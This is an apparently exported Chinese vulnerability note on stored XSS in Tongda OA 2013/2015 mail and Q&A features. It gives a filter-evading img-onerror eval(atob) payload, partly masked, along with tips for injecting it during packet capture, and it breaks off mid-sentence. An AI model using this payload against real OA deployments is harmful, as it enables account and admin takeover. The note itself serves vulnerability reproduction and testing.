	<body>
		<h1 class="csAD577193">
			<a name="通达oa-xss"><span class="csECDA2D3">通达</span><span class="csDE05BCC">oa xss</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">2013</span><span class="cs9C1B1871">、</span><span class="cs8926E06">2015</span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">发邮件的地方、问题问答的地⽅都存在</span><span class="cs8926E06">XSS</span><span class="cs9C1B1871">，可获取他人账号权限。⼀般情况下，</span><span class="cs8926E06">OA</span><span class="cs9C1B1871">会有前端进</span><span class="csD3A9CBE4">行</span><span class="cs9C1B1871">过滤，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">所以抓包时候去添加</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，之后会对事件进</span><span class="csD3A9CBE4">行</span><span class="cs9C1B1871">过滤，所以使用</span></p><p class="cs40DD2BC9"><span class="cs8926E06">poc</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;img src=x onerror=eval(atob(&#39;cz1jcmVXXXXXytNYXRoXXXXXXXXhbmRvbSgp&#39;))&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20xss_files/image0.png" width="560" height="223" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/通达oa/%e9%80%9a%e8%be%beoa%20xss_files/image1.png" width="560" height="203" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个漏</span><span class="csD3A9CBE4">洞</span><span class="cs9C1B1871">获取</span><span class="cs8926E06">admin</span><span class="cs9C1B1871">权限⾮</span></p></body>
